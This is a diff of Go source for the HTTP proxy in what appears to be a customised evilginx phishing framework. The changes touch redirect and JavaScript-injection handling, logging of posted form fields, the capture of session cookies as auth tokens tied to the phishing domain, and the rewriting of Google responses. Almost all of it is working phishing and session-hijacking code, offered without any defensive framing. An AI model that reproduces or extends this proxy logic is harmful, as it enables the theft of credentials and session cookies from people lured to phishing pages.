@@ -178,7 +178,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			// o_host := req.Host // o_host仅用于设置X-evilginx头
+			// o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -190,6 +190,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
 
+			// 重定向 和 js注入
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
@@ -250,6 +251,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									s_index, _ := p.sids[session_id]
 									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
 									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
+									log.Debug("[xwj] d_json: %s", string(d_json))
 									return req, resp
 								}
 							}
@@ -366,7 +368,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if l.RedirectUrl != "" {
 											session.RedirectURL = l.RedirectUrl
 										}
-										// 去除：重定向URL替换成钓鱼URL
 										// if session.RedirectURL != "" {
 										// 	session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 										// }
@@ -618,6 +619,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
+						// req.Body = ioutil.NopCloser(bytes.NewBuffer(body)) // code by xwj
 						req.ContentLength = int64(len(body))
 
 						log.Debug("POST: %s", req.URL.Path)
@@ -665,7 +667,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) && !strings.HasPrefix(string(body), "[") { //去掉json数组 by horris
+						} else if form_re.MatchString(contentType) && !strings.HasPrefix(string(body), "[") { //去掉json数组 by xwj
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -711,6 +713,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									for i, vv := range v {
 										// patch phishing URLs in POST params with original domains
 										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
+										// log.Debug("[xwj] POST %s = %s", k, req.PostForm[k][i])
 									}
 								}
 
@@ -893,6 +896,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								s.SetAccessURL(ps.PhishDomain)
 							}
 						}
 					}
@@ -1059,7 +1063,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if s, ok := p.sessions[ps.SessionId]; ok {
 								js_params = &s.Params
 							}
-							// log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							log.Debug("js_params: %s", js_params)
 							if err == nil {
@@ -1072,8 +1076,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				// // start code by horris
-				// // handle google special response 处理google特殊响应
+				// // start code by xwj
+				// // handle google special response
 				PREFIX := []byte(")]}'\n\n")
 				if bytes.HasPrefix(body, PREFIX) {
 					handleGoogleResponse := func(body []byte) []byte {
@@ -1129,7 +1133,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					body = newBody
 
 				}
-				// // end code by horris
+				// // end code by xwj
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
@@ -1231,7 +1235,6 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
-// 增加参数header，可用于phishlets通过intercept自定义header
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string, headers string) (*http.Request, *http.Response) {
 	if mime == "" {
 		mime = "text/plain"
@@ -1455,9 +1458,12 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			return len(hosts[i]) > len(hosts[j])
 		})
 
+		
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
+			log.Info("URL: %s", s_url)
 			u, err := url.Parse(s_url)
 			if err == nil {
+				log.Info("URL: %s", u.Host)
 				for _, h := range hosts {
 					if strings.ToLower(u.Host) == h {
 						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
